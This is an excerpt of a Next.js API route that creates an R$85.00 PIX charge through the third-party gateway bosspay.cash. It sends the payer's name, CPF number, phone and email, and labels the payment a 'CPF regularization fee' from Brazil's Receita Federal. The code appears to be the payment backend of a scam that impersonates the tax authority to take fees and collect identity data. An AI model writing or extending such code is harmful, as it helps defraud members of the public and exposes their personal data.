...
export async function POST(request: NextRequest) {
  try {
    ...
    const amountCents = Math.round((amount || 85.00) * 100)
    ...
    const response = await fetch("https://app.bosspay.cash/api/v1/pix/create", {
      ...
      body: JSON.stringify({
        amount_cents: amountCents, // R$ 85,00
        customer_name: customerName,
        customer_document: cleanDocument,
        customer_phone: customerPhone.replace(/\D/g, ""),
        customer_email: customerEmail || undefined,
        description: "Taxa de Regularização - CPF - Receita Federal",
    ...
    console.error("[v0] Error creating PIX CPF:", error)
    return NextResponse.json(
